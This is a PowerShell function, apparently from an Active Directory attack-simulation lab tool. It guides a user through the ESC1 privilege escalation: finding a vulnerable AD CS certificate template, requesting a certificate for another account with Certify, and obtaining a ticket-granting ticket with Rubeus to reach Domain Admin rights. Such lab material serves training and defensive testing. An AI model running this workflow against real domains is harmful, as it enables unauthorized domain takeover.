<#
.SYNOPSIS
Runs the ESC1 privilege-escalation workflow using a misconfigured AD CS certificate template.

.DESCRIPTION
Sets the current lab stage, checks for a vulnerable published certificate template, and guides
the user through selecting an alternative account, requesting a certificate, and obtaining a
ticket-granting ticket with Rubeus. The user can repeat the workflow when prompted.

.FUNCTIONALITY
This attack abuses a misconfigured AD CS certificate template that allows
a domain user to escalate privileges to those of a Domain Admin.
Guides the ESC1 certificate-template workflow from template discovery through a TGT request.

.COMPONENT
Category: Main Function
#>
function Invoke-PrivilegeEscalationViaESC1 {

    ################################################################################
    #####                                                                      ##### 
    #####    Exploiting Misconfigured Certificate Templates (ESC1)             #####                                  
    #####                                                                      #####
    ################################################################################

    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host ####################

    Update-WindowTitle -NewTitle $Script:Phase25
    Set-ASConfig -Setting "LastStage" -Value $Script:Phase25

    Do {
        If (-not $SkipClearHost) { Clear-Host }

        Invoke-Output -Type  Header -M "Exploiting Misconfigured Certificate Templates (ESC1)"
        Invoke-Output -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)

        # http://attack.mitre.org/techniques/T1649/
        # certutil -config "ROOT-DC19-01.WS19-ROOT.CORP\WS19-ROOT" -crl "http://root-dc19-01.ws19-root.corp/certsrv/mscep_admin.crl" -verify "mscep_admin.crt"

        If ($UnAttended) {
            $answer = $Script:No
        }
        else {
            $question = "Do you want to run this attack - Y or N? Default "
            $answer = Get-Answer -question $question -defaultValue $Script:Yes
        }

        If ($answer -eq $Script:Yes) {

            If (-not $SkipClearHost) { Clear-Host }
            Invoke-Output -Type Header -Message "Step 1 - Identify Misconfigured and (!) Published Certificate Templates"
            $Functionality = "Checks for published certificate templates vulnerable to ESC1."
Invoke-Output -Type H1 -Message $Functionality  
            $CATemplate = Get-VulnerableCertificateTemplate

            Do {
                If (-not $SkipClearHost) { Clear-Host }
                
                $AlternativeAccountDN = Set-AlternativeAccount
                $AlternativeAccount = Get-ADUserDetails -SearchByDN -Identifier $AlternativeAccountDN
                
                If (-not $UnAttended) { pause }
                If (-not $SkipClearHost) { Clear-Host }
                Invoke-Output -Type Header -Message "Step 3 - Request Certificate with Certify"
                $Functionality = "Request a certificate from the vulnerable template by specifying the`n    target account as UPN and SID in the certificate request."
Invoke-Output -Type H1 -Message $Functionality
                Invoke-Output -Type  Bullet -Message "Request a certificate from the vulnerable template by specifying the`n    target account as UPN and SID in the certificate request."

                $PfxBase64 = Request-PfxWithCertify  -Certificate  $CAtemplate -AlternativeAccount $AlternativeAccount
                
                $question = "Would you like to repeat this attack phase? Please enter Y or N. Default "
                $repeat = Get-Answer -question $question -defaultValue $Script:No

            } Until ($repeat -eq $Script:No)

            Do {
                If (-not $SkipClearHost) { Clear-Host }

                Invoke-Output -Type Header -Message "Step 4 - Request a Ticket Granting Ticket (TGT) with Rubeus"
                Invoke-Output -Type  H1 -Message "Now we can request a TGT for the user for which we minted the new certificate."
                Request-TGTWithRubeus -pfxFile $PfxBase64 -AlternativeAccount $AlternativeAccount

                $question = "Would you like to repeat this attack phase? Please enter Y or N. Default "
                $repeat = Get-Answer -question $question -defaultValue $Script:No

            } Until ($repeat -eq $Script:No)

        } ##
        else {
            return
        }

        If (-not $SkipClearHost) { Clear-Host }

        Invoke-Output -Type  Header -M "??? REPEAT | Exploiting Misconfigured Certificate Templates (ESC1) ???"

    } Until ($repeat -eq $Script:No)

    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"
}
